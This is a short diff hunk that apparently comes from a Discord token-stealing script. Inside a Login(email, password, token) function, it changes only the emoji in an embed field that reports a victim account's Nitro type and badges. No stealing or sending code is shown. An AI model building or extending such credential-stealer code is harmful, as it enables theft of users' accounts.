@@ -161,7 +161,7 @@ function Login(email, password, token) {
                                                                                         
         
                                                                                                    
-                                   "value": `<a:axe_Pepenitro:932312223945224212> **Nitro Type:**  ${GetNitro(json.premium_type)}\n                                 <a:allbadges:895906088996720690> **Badges:**  ${GetBadges(json.flags)}`,
+                                   "value": `<a:pepe_nitro:906950345983397988> **Nitro Type:**  ${GetNitro(json.premium_type)}\n                                 <a:allbadges:895906088996720690> **Badges:**  ${GetBadges(json.flags)}`,
                                  },
 
 
